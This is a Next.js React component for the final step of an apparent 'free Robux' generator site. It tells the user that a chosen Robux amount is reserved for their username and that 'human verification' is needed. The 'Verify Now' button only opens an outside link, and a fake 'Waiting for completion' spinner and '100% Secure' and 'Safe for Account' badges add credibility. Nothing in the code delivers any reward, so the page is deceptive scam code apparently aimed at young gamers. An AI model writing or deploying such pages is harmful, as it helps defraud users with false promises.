'use client';

import { useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { useRobux } from '../RobuxContext';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { CheckCircle2, ShieldCheck, Sparkles, Loader2 } from 'lucide-react';
import { GLOBAL_CTA_LINK } from '@/lib/games';

const ROBUX_ICON = "https://res.cloudinary.com/dmafb7518/image/upload/v1775750139/GAME_FLASH_20260409_212147_0000_eu5mys.png";

export default function FinalPage() {
  const router = useRouter();
  const { selectedReward, username } = useRobux();

  useEffect(() => {
    if (!selectedReward || !username) router.push('/robux');
  }, [selectedReward, username, router]);

  if (!selectedReward) return null;

  const handleFinalContinue = () => {
    window.open(GLOBAL_CTA_LINK, "_blank", "noopener,noreferrer");
  };

  return (
    <div className="space-y-8 animate-in zoom-in-95 duration-700">
      <div className="flex items-center justify-end mb-4">
        <div className="flex gap-2">
           <div className="w-8 h-1 bg-primary rounded-full" />
           <div className="w-8 h-1 bg-primary rounded-full" />
           <div className="w-8 h-1 bg-primary rounded-full" />
        </div>
      </div>

      <header className="text-center space-y-2">
        <h1 className="text-4xl font-black tracking-tighter">Finishing...</h1>
        <p className="text-white/40 font-bold text-sm">Almost there! Final verification needed</p>
      </header>

      <Card className="glass-morphism bg-white/5 border-white/10 rounded-[3rem] overflow-hidden shadow-2xl relative">
        <div className="absolute top-0 inset-x-0 h-1 bg-gradient-to-r from-transparent via-primary/50 to-transparent" />
        
        <CardContent className="p-12 text-center space-y-8">
          <div className="flex justify-center">
            <div className="w-24 h-24 bg-primary/10 rounded-full flex items-center justify-center relative shadow-[0_0_50px_rgba(85,206,247,0.15)]">
              <ShieldCheck className="w-12 h-12 text-primary" />
              <Sparkles className="absolute -top-2 -right-2 text-primary w-8 h-8 animate-pulse" />
            </div>
          </div>

          <div className="space-y-3">
            <h2 className="text-3xl font-black">Verification Required</h2>
            <p className="text-white/60 font-medium leading-relaxed max-w-sm mx-auto">
              To finalize the transfer of <span className="text-primary font-bold">{selectedReward.amount.toLocaleString()} Robux</span> to <span className="text-white font-bold">{username}</span>, please complete the human verification.
            </p>
          </div>

          <div className="p-6 bg-white/5 rounded-[2rem] border border-white/5 space-y-4">
            <div className="flex items-center gap-4 text-left">
              <div className="w-12 h-12 bg-primary/10 rounded-2xl flex items-center justify-center flex-shrink-0">
                <CheckCircle2 className="text-primary w-6 h-6" />
              </div>
              <div>
                <p className="font-black text-sm uppercase">Assets Reserved</p>
                <p className="text-[10px] text-white/30 font-bold uppercase tracking-tighter">Ready for instant delivery</p>
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <Button 
              onClick={handleFinalContinue}
              className="w-full h-20 bg-primary hover:bg-primary/80 text-primary-foreground font-black text-2xl rounded-2xl shadow-[0_0_40px_rgba(85,206,247,0.4)] transition-all hover:scale-[1.02] active:scale-95"
            >
              Verify Now
            </Button>
            <div className="flex items-center justify-center gap-2 text-white/20">
               <Loader2 className="w-3 h-3 animate-spin" />
               <span className="text-[9px] font-black uppercase tracking-widest">Waiting for completion...</span>
            </div>
          </div>

          <div className="flex items-center justify-center gap-6 text-[9px] font-black text-white/20 uppercase tracking-[0.2em] pt-4">
            <span>100% Secure</span>
            <span className="w-1 h-1 bg-white/10 rounded-full" />
            <span>Anti-Bot System</span>
          </div>
        </CardContent>
      </Card>
      
      <div className="grid grid-cols-2 gap-6 opacity-50">
         <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center">
               <ShieldCheck className="w-4 h-4" />
            </div>
            <p className="text-[9px] font-bold uppercase">No Password Needed</p>
         </div>
         <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center">
               <ShieldCheck className="w-4 h-4" />
            </div>
            <p className="text-[9px] font-bold uppercase">Safe for Account</p>
         </div>
      </div>
    </div>
  );
}
